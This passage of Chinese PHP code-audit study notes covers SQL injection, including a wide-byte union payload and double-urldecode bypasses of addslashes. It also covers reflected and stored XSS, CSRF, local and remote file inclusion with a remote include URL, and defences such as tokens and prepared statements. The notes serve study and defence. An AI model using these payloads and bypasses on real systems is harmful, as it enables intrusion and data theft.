-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当前SQL语句：<span class="keyword">SELECT</span> <span class="keyword">id</span>,username <span class="keyword">FROM</span> userinfo <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'�\'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="keyword">user</span>()<span class="comment">#'</span></span><br><span class="line">结果：<span class="built_in">Array</span> ( [<span class="number">0</span>] =&gt; <span class="keyword">test</span> [<span class="number">1</span>] =&gt; root@localhost )</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-二次urldecode注入"><a href="#3-二次urldecode注入" class="headerlink" title="3.二次urldecode注入"></a><strong>3.二次urldecode注入</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=addslashes($_GET[<span class="string">'p'</span>]);</span><br><span class="line">$b=urldecode($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$a='</span>.$a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$b='</span>.$b;</span><br></pre></td></tr></table></figure>
-
-<p>输入：<strong>?p=1%2527</strong></p>
-<p>输出：*<em>$a=1%27     *</em></p>
-<p>​           <strong>$b=1’</strong></p>
-<p>现在的Web程序通常用<strong>addslashes()、mysql_real_escape_string()、mysql_escape_string()函数</strong></p>
-<p>或者开启GPC对<strong>单引号、双引号、\  和NULL 加  \   转义</strong></p>
-<p>但如果使用<strong>了urldecode or  rawurldecode 函数</strong> 会导致二次解码生成单引号而引发注入</p>
-<p>4.espcms 搜索注入分析</p>
-<p>部分代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$key=urldecode(<span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">'key'</span>,<span class="string">'R'</span>));</span><br><span class="line">···</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($key))&#123;</span><br><span class="line">	$db_where.=<span class="string">"AND FIND_IN_SET('$key',tags)"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>由于$key变量使用了urldecode，从而可以绕过GPC</p>
-<p>如果$key不为空，则拼接到SQL语句中，导致产生注入漏洞</p>
-<h3 id="4-漏洞防范"><a href="#4-漏洞防范" class="headerlink" title="4.漏洞防范"></a><strong>4.漏洞防范</strong></h3><p>在PHP5.4版本之前可以用魔术引号解决</p>
-<p>后面虽然被取消了，但可以用<strong>过滤函数和类</strong>来解决</p>
-<p>如discuz、dedecms、phpcms等程序都使用了过滤类</p>
-<p>但仍然存在绕过的问题，最好的解决方法是利用<strong>预编译的方式</strong></p>
-<h4 id="4-1-gpc-rutime-魔术引号"><a href="#4-1-gpc-rutime-魔术引号" class="headerlink" title="4.1 gpc/rutime 魔术引号"></a><strong>4.1 gpc/rutime 魔术引号</strong></h4><p>通常数据污染有2种，一种是GET、POST等被动接收参数</p>
-<p>还有一种是主动获取参数，如读取远程页面或者文件内容</p>
-<p>所以防止SQL注入，就是要守住这2条路！</p>
-<p>魔术引号对int型的注入是没多大作用的。</p>
-<h4 id="4-2-过滤函数和类"><a href="#4-2-过滤函数和类" class="headerlink" title="4.2 过滤函数和类"></a><strong>4.2 过滤函数和类</strong></h4><p>过滤函数和类有2种使用场景，一种是程序入口统一过滤，像框架程序用的多</p>
-<p>另一种是在程序进行SQL语句之前使用，除了PHP内置的一些过滤单引号等函数外</p>
-<p>还有一些开源类过滤union、select等关键字</p>
-<p><strong>1.addslashes</strong>函数</p>
-<p>以下方法可以绕过该函数</p>
-<table>
-<thead>
-<tr>
-<th>$userid = urldecode($userid)</th>
-<th>注入语句进行两次编码，首先通过addslashes()过滤，然后urlencode解码</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>$userid = rawurldecode($userid)</strong></td>
-<td></td>
-</tr>
-<tr>
-<td><strong>$userid = base64_decode($userid)</strong></td>
-<td><strong>首先通过addslashes()过滤，然后urlencode解码</strong></td>
-</tr>
-<tr>
-<td><strong>$userid = json_encode($userid)</strong></td>
-<td><strong>该函数把\转换为\，两个反斜杠抵消。</strong></td>
-</tr>
-</tbody></table>
-<p><strong>2.mysql_ (real_) escape_string 函数</strong></p>
-<p>这2个函数都是对字符串进行过滤，在PHP4.0.3以上版本才存在</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00 \n \r \ &#39; &quot; \xla    这些字符受到影响</span><br></pre></td></tr></table></figure>
-
-<p>推荐使用mysql_real_escape_string() ，因为它接受的是一个连接句柄并根据当前字符集转义字符串</p>
-<p>例如：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"select * from test where id=' "</span>.$id.<span class="string">" '  "</span>;</span><br></pre></td></tr></table></figure>
-
-<p>当id=1’ 时，输出id=’ 1 \ ‘’</p>
-<p><strong>3.intval 等字符转换</strong></p>
-<p>代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=intval(<span class="string">"1 union select"</span>);</span><br><span class="line"><span class="keyword">echo</span> $id;  <span class="comment">#输出为1</span></span><br></pre></td></tr></table></figure>
-
-<p>intval 是将变量转换成int型,可以防止盲注等方式绕过。</p>
-<h4 id="4-3-PDO-prepare-预编译"><a href="#4-3-PDO-prepare-预编译" class="headerlink" title="4.3 PDO prepare 预编译"></a><strong>4.3 PDO prepare 预编译</strong></h4><h3 id="5-XSS漏洞"><a href="#5-XSS漏洞" class="headerlink" title="5.XSS漏洞"></a><strong>5.XSS漏洞</strong></h3><p>在Web漏洞中，XSS是最多的！它可以通过外部输入然后直接在浏览器端触发，即<strong>反射型XSS</strong></p>
-<p>还可以通过把代码保存在数据库或文件中，当Web程序读取利用代码并输出在页面时触发–<strong>存储型XSS</strong></p>
-<p>危害：前端页面能做的事情，它都可以（如获取cookie，修改页面钓鱼等）</p>
-<h4 id="5-1-挖掘经验"><a href="#5-1-挖掘经验" class="headerlink" title="5.1 挖掘经验"></a><strong>5.1 挖掘经验</strong></h4><p>挖掘XSS漏洞的关键在于寻找没有被过滤的参数，且这些参数传入到输出函数</p>
-<p>常用的输出函数如下：<strong>var_dump、var_export、die、sprintf、print、print_r、echo、printf</strong></p>
-<p>所以只需要寻作带有变量的这些函数即可</p>
-<p>注意：<strong>浏览器环境十分影响XSS漏洞的利用</strong>，还需要掌握各种<strong>浏览器容错、编码等特性和数据协议</strong></p>
-<p>XSS漏洞经常出现在<strong>文章发表、评论回复、留言以及资料设置</strong>等地方</p>
-<p>因为这里有各种图片引用、文字格式设置等，经常出现<strong>对标签事件过滤不严格</strong>导致的XSS</p>
-<p>还有就是用户昵称可能不止一处可以修改，不一定所有地方都严格过滤了，所以可以多关注这几个地方</p>
-<h4 id="5-2-反射型XSS"><a href="#5-2-反射型XSS" class="headerlink" title="5.2 反射型XSS"></a><strong>5.2 反射型XSS</strong></h4><p>可通过扫描器黑盒直接发现</p>
-<p>只需要将&lt;&gt;、‘ 、“ 等题交到Web服务器，检查返回的HTML页面是否保留原来的特殊字符就可以判断</p>
-<p>在白盒审计中，只需要寻作带有参数的输出函数，然后根据输出函数对输出内容回溯输入参数，观察是否经过过滤</p>
-<p>测试代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以下是QQ私密接口</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"openid"</span>])&#123;</span><br><span class="line">    <span class="comment">//授权成功后，会返回用户的openid</span></span><br><span class="line">    <span class="comment">//检查返回的openid是否是合法id</span></span><br><span class="line">    <span class="keyword">if</span>(!is_valid_openid($_GET[<span class="string">"openid"</span>],$_GET[<span class="string">"timestamp"</span>],$_GET[<span class="string">"oauth_signature"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        showerr(<span class="string">'API账号有误！'</span>);</span><br><span class="line">        <span class="comment">//demo对错误简单处理</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"##invalid openid\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"sig:"</span>.$_GET[<span class="string">"oauth_signature"</span>].<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>代码中echo “sig:”.$ _GET [“oauth_signature”].”\n”;   直接将  $ _ GET [“oauth_signature”] 的值输出到浏览器</p>
-<p>所以可以直接利用GET方式注入代码</p>
-<h4 id="5-3-存储型XSS分析"><a href="#5-3-存储型XSS分析" class="headerlink" title="5.3 存储型XSS分析"></a><strong>5.3 存储型XSS分析</strong></h4><p>代码如下：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;span styele=<span class="string">"color:##FF6600"</span> title=<span class="string">"&lt;img src=&#123;#$list.link_logo#&#125; border=0/&gt;"</span> </span><br><span class="line">class="vtio"&gt;[logo]&lt;/span&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里代码直接把显示logo的img标签放在span标签的title里面</p>
-<p>当鼠标滑过的时候，会调用事件执行显示title，即执行img标签</p>
-<p>所以这里的利用点就是可以是HTML实体编码，从而绕过安全检查</p>
-<p>在logo处输入 1 oner&114;or=ale &amp; #114;t(1)</p>
-<h4 id="5-4-XSS漏洞防范"><a href="#5-4-XSS漏洞防范" class="headerlink" title="5.4 XSS漏洞防范"></a><strong>5.4 XSS漏洞防范</strong></h4><p>特殊字符HTML实体转码</p>
-<p>标签事件属性黑白名单</p>
-<h3 id="6-CSRF漏洞"><a href="#6-CSRF漏洞" class="headerlink" title="6.CSRF漏洞"></a><strong>6.CSRF漏洞</strong></h3><p>CSRF=Cross-site request forgery 跨站请求伪造</p>
-<p>通俗来讲就是劫持其它用户去进行一些请求</p>
-<p>简单的攻击流程讲解：</p>
-<p>假设直接请求x.com/del.php?id=1 可以删除ID为1的账号，但是需要管理权限</p>
-<p>如果在其它网站页面加入&lt; img src=” http: //x.com/del.php?id=1 “&gt;,让管理员打开，就达到目的了</p>
-<p>更严重的像添加管理员账号、修改网站配值直接写入webshell等等</p>
-<h4 id="6-1-挖掘经验"><a href="#6-1-挖掘经验" class="headerlink" title="6.1 挖掘经验"></a><strong>6.1 挖掘经验</strong></h4><p>CSRF主要是用于越权操作，所有漏洞自然在有权限控制的地方，像管理后台、会员中心</p>
-<p>论坛帖子以及交意管理等，管理后台又是最高危的地方</p>
-<p>挖掘CSRF的时候，可以先搭好环境，打开几个非静态操作的页面，抓包查看有没有token</p>
-<p>如果没有token，直接请求这个页面，不带refer</p>
-<p>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</p>
-<p>从白盒的角度来说，只要读代码的时候看看几个核心文件里面有没有验证token和referer相关的代码，这里的核心文件是指被大量文件引用的基础文件，或者直接搜”token”这个关键词。</p>
-<h4 id="6-2-漏洞防范"><a href="#6-2-漏洞防范" class="headerlink" title="6.2 漏洞防范"></a><strong>6.2 漏洞防范</strong></h4><p>防御CSRF漏洞的最主要问题是解决可信的问题，即使是管理员权限提交到服务器的数据也不一定是完全可信的</p>
-<p>所以有2种方式：1）增加token/referer验证，避免img标签请求的水坑攻击 2）增加验证码</p>
-<p><strong>1.Token验证</strong></p>
-<p>token翻译为”标志”，在计算机认证领域叫令牌</p>
-<p>简单理解为在页面或者cookie里加一个不可预测的字符串，服务器在接收操作请求的时候只要验证下这个字符串是不是上次访问留下的，即可判断。</p>
-<p>因为如果没有访问上一个页面，是无法得到这个token的，除非结合XSS漏洞或者其它手段获得通信数据</p>
-<p>Token实现测试代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">function set_token()&#123;</span><br><span class="line">	$_SESSION[&#39;token&#39;]&#x3D;md5(time()+rand(1,1000));</span><br><span class="line">&#125;</span><br><span class="line">function check_token()&#123;</span><br><span class="line">	if(isset($_POST[&#39;token&#39;])&amp;&amp;$_POST[&#39;token&#39;]&#x3D;&#x3D;&#x3D;$_SESSION[&#39;token&#39;])</span><br><span class="line">	&#123;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123; return false;&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_SESSION[&#39;token&#39;])&amp;&amp;check_token())&#123;</span><br><span class="line">	echo &quot;success&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;failed&quot;;&#125;</span><br><span class="line">set_token();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;&lt;?&#x3D;$_SESSION[&#39;token&#39;]?&gt;&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<hr>
-<h2 id="漏洞挖掘与防范（进阶篇）"><a href="#漏洞挖掘与防范（进阶篇）" class="headerlink" title="漏洞挖掘与防范（进阶篇）"></a><strong>漏洞挖掘与防范（进阶篇）</strong></h2><h3 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h3><p>文件包含分为本地和远程包含，渗透过程中文件包含漏洞大多可以直接利用<strong>获取webshell</strong></p>
-<p>文件包含函数有<strong>include()、include_once()、require()、require_once()</strong></p>
-<p>它们之间的区别在于<strong>include()、include_once()</strong>在包含文件出错的时候，下面的代码依旧执行</p>
-<p>而<strong>require()、require_once()</strong>会直接报错退出程序</p>
-<h4 id="1-1挖掘经验"><a href="#1-1挖掘经验" class="headerlink" title="1.1挖掘经验"></a><strong>1.1挖掘经验</strong></h4><p>文件包含漏洞大多出现在模块加载、模板加载、以及cache调用的地方</p>
-<h4 id="1-2-本地文件包含"><a href="#1-2-本地文件包含" class="headerlink" title="1.2 本地文件包含"></a><strong>1.2 本地文件包含</strong></h4><p>测试代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">//初始化....</span></span><br><span class="line">define(<span class="string">"ROOT"</span>,dirname(<span class="string">'_FILE_'</span>).<span class="string">'/'</span>);</span><br><span class="line"><span class="comment">//加载模块</span></span><br><span class="line">$mod=$_GET[<span class="string">'mod'</span>];</span><br><span class="line"><span class="keyword">echo</span> ROOT.$mod.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>(ROOT.$mod.<span class="string">'.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//5.2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>输出结果：</p>
-<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" style="zoom:80%;">
-
-<p>本地文件包含是指只能包含本机文件的文件包含漏洞，大多出现在<strong>模块加载、模板加载和cache调用</strong>这些地方</p>
-<p>本地文件包含有多种利用方式，比如上传一个<strong>允许上传的文件格式的文件</strong>再包含来执行代码，包含PHP上传的临时文件</p>
-<p>在请求URL或者ua里面加入要执行的代码，<strong>WebServer记录到日志后再包含WebServer的日志</strong></p>
-<h4 id="1-3-远程文件包含"><a href="#1-3-远程文件包含" class="headerlink" title="1.3 远程文件包含"></a><strong>1.3 远程文件包含</strong></h4><p>远程文件包含是指可以包含远程文件的包含漏洞，远程文件包含需要设置<strong>allow_url_include=On</strong></p>
-<p>相对于本地文件包含，它更容易利用，但出现的频率较低</p>
-<p>下面是基于HTTP协议测试代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/phpsafe/5.2.php?url=http://192.168.2.108/1.txt</span></span><br><span class="line"><span class="comment">//1.txt的内容是<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">//打印出本机phpinfo的信息</span></span><br></pre></td></tr></table></figure>
-
-<p>远程文件包含还有一种PHP输入输出流的利用方式，可以直接执行POST代码</p>
-<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" style="zoom:80%;">
-
-<h4 id="1-4-文件包含截断"><a href="#1-4-文件包含截断" class="headerlink" title="1.4 文件包含截断"></a><strong>1.4 文件包含截断</strong></h4><p>第一种是利用%00来截断，这是最古老的一种</p>
-<hr>
-<h2 id="PHP常用函数"><a href="#PHP常用函数" class="headerlink" title="PHP常用函数"></a>PHP常用函数</h2><h3 id="print-r-函数"><a href="#print-r-函数" class="headerlink" title="print_r() 函数"></a><strong>print_r() 函数</strong></h3><p><strong>print_r()</strong> 函数用于打印变量，以更容易理解的形式展示，PHP 版本要求: PHP 4, PHP 5, PHP 7</p>
-<p>例如：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span> (<span class="string">'a'</span> =&gt; <span class="string">'apple'</span>, <span class="string">'b'</span> =&gt; <span class="string">'banana'</span>, <span class="string">'c'</span> =&gt; <span class="keyword">array</span> (<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>));</span><br><span class="line">print_r ($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>输出为：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [a] =&gt; apple [b] =&gt; banana [c] =&gt; <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; x [<span class="number">1</span>] =&gt; y [<span class="number">2</span>] =&gt; z ) )</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="echo、print、print-r-三者区别"><a href="#echo、print、print-r-三者区别" class="headerlink" title="echo、print、print_r 三者区别"></a><strong>echo、print、print_r 三者区别</strong></h3><table>
-<thead>
-<tr>
-<th align="center"></th>
-<th align="center">属性</th>
-<th align="center">打印输出</th>
-<th align="center">用法</th>
-<th align="center">返回值</th>
-<th align="center">执行          速率</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">echo</td>
-<td align="center">PHP语句</td>
-<td align="center">输出一个或者多个字符串</td>
-<td align="center">echo   或者 echo()</td>
-<td align="center">无</td>
-<td align="center">最快</td>
-</tr>
-<tr>
-<td align="center">print</td>
-<td align="center">实际上不是函数（而是语言结构），所以可以不用圆括号包围参数列表</td>
-<td align="center">只能打印出简单类型变量的值(如int,string)</td>
-<td align="center">print  或者print()</td>
-<td align="center">1</td>
-<td align="center">其次</td>
-</tr>
-<tr>
-<td align="center">print_r</td>
-<td align="center">函数,语句没有返回值,函数可以有返回值(即便没有用)</td>
-<td align="center">可以打印出复杂类型变量的值(如数组,对象)</td>
-<td align="center">print_r()</td>
-<td align="center">输出成功时，返回true，不成功时返回false</td>
-<td align="center">最慢</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="SQL常用语句解释"><a href="#SQL常用语句解释" class="headerlink" title="SQL常用语句解释"></a>SQL常用语句解释</h2><h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3><p>select <strong>id,username</strong> from userinfo  where id=1 <strong>union</strong> select <strong>1,2</strong></p>
-<p>注意，union前后的列数要一样！</p>
-
-      
-      <!-- reward -->
-      
-    </div>
-    
-    
-      <!-- copyright -->
-      
-    <footer class="article-footer">
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-
 
     </footer>
 
